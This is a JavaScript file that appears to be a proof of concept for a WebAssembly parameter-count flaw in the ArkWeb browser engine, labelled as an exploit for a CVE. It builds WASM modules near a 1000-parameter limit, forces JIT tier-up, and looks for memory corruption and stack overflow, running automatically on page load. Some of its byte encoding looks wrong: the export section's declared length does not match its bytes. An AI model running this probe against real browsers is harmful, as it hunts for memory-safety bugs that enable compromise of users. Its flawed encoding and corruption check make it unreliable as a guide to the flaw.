function log(m){let e=document.getElementById('log');if(e)e.innerHTML+=m+'\n';document.title='['+m.substring(0,50)+']';}

function encodeLEB128(v){let r=[];do{let b=v&0x7f;v>>=7;if(v)b|=0x80;r.push(b)}while(v);return r}

function buildWasmModule(paramCount){
    let b=[];
    b.push(0,0x61,0x73,0x6d,1,0,0,0); // magic+version

    // Type section: func(paramCount x i32) -> i32
    let ts=[...encodeLEB128(1), 0x60, ...encodeLEB128(paramCount)];
    for(let i=0;i<paramCount;i++) ts.push(0x7f);
    ts.push(...encodeLEB128(1), 0x7f);
    b.push(1, ...encodeLEB128(ts.length), ...ts);

    // Function section
    b.push(3, ...encodeLEB128(2), 1, 0);

    // Export section: export "f" = func 0
    b.push(7, ...encodeLEB128(4), 1, 1, 0x66, 0, 0);

    // Code section: func body = { i32.const 42; end }
    // No locals, just return a constant (avoids local.get index issues)
    let body = [0, 0x41, 0x2a, 0x0b]; // 0 locals, i32.const 42, end
    let code_entry = [...encodeLEB128(body.length), ...body];
    let cs = [1, ...encodeLEB128(code_entry.length), ...code_entry];
    b.push(0x0a, ...encodeLEB128(cs.length), ...cs);

    return new Uint8Array(b);
}

function exploit(){
    log('[*] CVE-2025-0999 — ArkWeb WASM Boundary Test v2');
    log('[*] Testing param counts around ArkWeb limit (1000)...');

    let results = {};
    for(let pc of [10, 100, 500, 900, 950, 990, 995, 998, 999, 1000, 1001]){
        try{
            let mod = new WebAssembly.Module(buildWasmModule(pc));
            let inst = new WebAssembly.Instance(mod);
            let args = new Array(pc).fill(42);
            let r = inst.exports.f.apply(null, args);
            results[pc] = 'OK r='+r;
            log('[+] '+pc+' params: OK, result='+r);
        }catch(e){
            results[pc] = e.message.substring(0,80);
            log('[!] '+pc+' params: '+e.message.substring(0,100));
        }
    }

    // Now test tier-up with max allowed params
    log('[*] Testing 999 params with 10000 calls (JIT tier-up)...');
    try{
        let mod = new WebAssembly.Module(buildWasmModule(999));
        let inst = new WebAssembly.Instance(mod);
        let args = new Array(999).fill(0);

        let start = Date.now();
        for(let i=0;i<10000;i++){
            inst.exports.f.apply(null, args);
        }
        let elapsed = Date.now()-start;
        log('[+] 10000 calls done in '+elapsed+'ms');

        // Check browser stability
        let test = new ArrayBuffer(1024);
        let view = new DataView(test);
        view.setFloat64(0, 1.1);
        if(view.getFloat64(0) === 1.1){
            log('[*] Memory integrity OK after tier-up');
        } else {
            log('[+] MEMORY CORRUPTION after tier-up!');
        }
    }catch(e){
        log('[!] Tier-up error: '+e.message);
        if(e.message.includes('stack') || e.message.includes('Maximum call')){
            log('[*] Stack overflow with 999 args — this is a different attack surface!');
        }
    }

    // Try calling WASM function from another WASM function (WASM→WASM wrapper)
    log('[*] Testing WASM→WASM call with many params...');
    try{
        // Module A: export f(999 params)
        let modA = new WebAssembly.Module(buildWasmModule(999));
        let instA = new WebAssembly.Instance(modA);

        // Try to import and call from JS side
        let args = new Array(999).fill(1);
        let r = instA.exports.f(...args);
        log('[+] Spread call with 999 params: r='+r);
    }catch(e){
        log('[!] Spread 999: '+e.message.substring(0,100));
    }

    log('[*] Done.');
}
setTimeout(exploit,500);
